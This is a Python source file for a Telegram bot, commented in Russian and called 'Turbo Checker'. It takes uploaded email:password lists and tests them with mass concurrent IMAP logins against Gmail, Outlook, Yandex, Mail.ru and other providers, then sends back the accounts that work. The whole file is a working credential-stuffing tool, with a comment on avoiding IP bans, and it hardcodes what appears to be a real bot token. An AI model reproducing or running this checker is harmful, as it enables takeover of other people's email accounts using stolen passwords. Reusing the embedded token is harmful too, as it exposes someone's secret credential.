import telebot
import asyncio
import aioimaplib
import time
import os
import threading
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# --- КОНФИГУРАЦИЯ ---
BOT_TOKEN = "8509142665:AAEiycyacUVbhq6-iZ1moMcv8lVKm4jQN6o"
MAX_CONCURRENT_TASKS = 300  # Количество одновременных подключений (не ставь >500 без прокси, забанят IP)
TIMEOUT = 15                # Таймаут ожидания ответа от сервера

bot = telebot.TeleBot(BOT_TOKEN)

# --- БАЗА IMAP СЕРВЕРОВ (Расширенная) ---
IMAP_DOMAINS = {
    'gmail.com': 'imap.gmail.com',
    'yahoo.com': 'imap.mail.yahoo.com',
    'hotmail.com': 'imap-mail.outlook.com',
    'outlook.com': 'imap-mail.outlook.com',
    'yandex.ru': 'imap.yandex.ru',
    'mail.ru': 'imap.mail.ru',
    'bk.ru': 'imap.mail.ru',
    'inbox.ru': 'imap.mail.ru',
    'list.ru': 'imap.mail.ru',
    'rambler.ru': 'imap.rambler.ru',
    'gmx.com': 'imap.gmx.com',
    'aol.com': 'imap.aol.com',
    'icloud.com': 'imap.mail.me.com',
    # Добавь сюда любые другие домены
}

# --- АСИНХРОННАЯ ПРОВЕРКА ---

async def check_email_async(email, password, semaphore, stats):
    """Асинхронная проверка одного аккаунта"""
    async with semaphore:  # Ограничиваем количество одновременных входов
        try:
            domain = email.split('@')[1].lower()
            host = IMAP_DOMAINS.get(domain, f"imap.{domain}") # Если нет в базе, пробуем imap.домен

            # Подключаемся (без SSL пока, потом апгрейдим) или сразу SSL
            # aioimaplib работает немного иначе, чем imaplib
            try:
                client = aioimaplib.IMAP4_SSL(host, timeout=TIMEOUT)
                await client.wait_hello_from_server()
            except:
                stats['errors'] += 1
                return None

            try:
                login_result = await client.login(email, password)
                # Ответ сервера: 'OK' или 'NO'
                if login_result and login_result.result == 'OK':
                    stats['good'] += 1
                    await client.logout()
                    return f"{email}:{password}"
                else:
                    stats['bad'] += 1
            except:
                stats['bad'] += 1 # Ошибка логина чаще всего = неверный пароль
            
            try:
                await client.logout()
            except:
                pass

        except Exception:
            stats['errors'] += 1
        
        return None

async def runner(lines, chat_id, message_id):
    """Главный асинхронный цикл"""
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_TASKS)
    stats = {'good': 0, 'bad': 0, 'errors': 0, 'total': len(lines)}
    valid_accounts = []
    
    start_time = time.time()
    last_update = 0
    
    tasks = []
    
    # Создаем задачи
    for line in lines:
        if ':' in line or ';' in line:
            clean_line = line.replace(';', ':').strip()
            try:
                email, password = clean_line.split(':', 1)
                task = asyncio.create_task(check_email_async(email, password, semaphore, stats))
                tasks.append(task)
            except:
                continue

    # Запускаем и ждем выполнения, попутно обновляя статус
    # Используем as_completed чтобы обрабатывать по мере завершения, но для простоты статистики:
    
    pending = tasks
    while pending:
        # Ждем завершения хотя бы части задач или таймаута для обновления UI
        done, pending = await asyncio.wait(pending, timeout=2.0, return_when=asyncio.FIRST_COMPLETED)
        
        # Собираем результаты готовых
        for task in done:
            res = task.result()
            if res:
                valid_accounts.append(res)
        
        # Обновляем сообщение раз в 3 секунды
        if time.time() - last_update > 3.0:
            checked = stats['good'] + stats['bad'] + stats['errors']
            elapsed = time.time() - start_time
            speed = int(checked / elapsed) if elapsed > 0 else 0
            
            percent = 0
            if stats['total'] > 0:
                percent = int((checked / stats['total']) * 100)
            
            bar = "▓" * (percent // 10) + "░" * (10 - (percent // 10))
            
            text = (
                f"⚡️ **Turbo Checker**\n"
                f"{bar} {percent}%\n\n"
                f"✅ Good: {stats['good']}\n"
                f"❌ Bad: {stats['bad']}\n"
                f"⚠️ Errors: {stats['errors']}\n"
                f"🚀 Скорость: {speed} акк/сек\n"
                f"⏱ Времени прошло: {int(elapsed)}с"
            )
            try:
                bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown")
            except:
                pass
            last_update = time.time()

    return valid_accounts

def start_checking_process(message, file_path):
    """Обертка для запуска асинхронного кода в потоке"""
    try:
        # Читаем файл (учитываем кодировки)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
        except:
             with open(file_path, 'r', encoding='cp1251', errors='ignore') as f:
                lines = f.readlines()
        
        os.remove(file_path) # Удаляем исходник
        
        if not lines:
            bot.send_message(message.chat.id, "Файл пуст!")
            return

        msg = bot.reply_to(message, "🚀 Разогреваю движки... Загрузка базы...")
        
        # ЗАПУСК ASYNCIO
        valid_list = asyncio.run(runner(lines, message.chat.id, msg.message_id))
        
        # ФИНАЛ
        if valid_list:
            result_file = f"Valid_{message.chat.id}.txt"
            with open(result_file, 'w') as f:
                f.write("\n".join(valid_list))
            
            with open(result_file, 'rb') as f:
                bot.send_document(
                    message.chat.id, 
                    f, 
                    caption=f"🏁 **Готово!**\nНайдено валида: {len(valid_list)}",
                    parse_mode="Markdown"
                )
            os.remove(result_file)
        else:
            bot.edit_message_text("😔 Ни одного рабочего аккаунта не найдено.", message.chat.id, msg.message_id)

    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка: {e}")

# --- HANDLERS ---

@bot.message_handler(commands=['start'])
def welcome(message):
    bot.reply_to(message, "🔥 Кидай базу .txt (mail:pass).\nЯ проверю её на максимальной скорости.")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "Только .txt файлы!")
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        file_path = f"base_{message.chat.id}.txt"
        with open(file_path, 'wb') as new_file:
            new_file.write(downloaded_file)
        
        # Запускаем в отдельном потоке, чтобы бот не завис
        threading.Thread(target=start_checking_process, args=(message, file_path)).start()
        
    except Exception as e:
        bot.reply_to(message, f"Ошибка загрузки: {e}")

if __name__ == '__main__':
    print("Бот запущен и готов к работе!")
    bot.polling(none_stop=True)
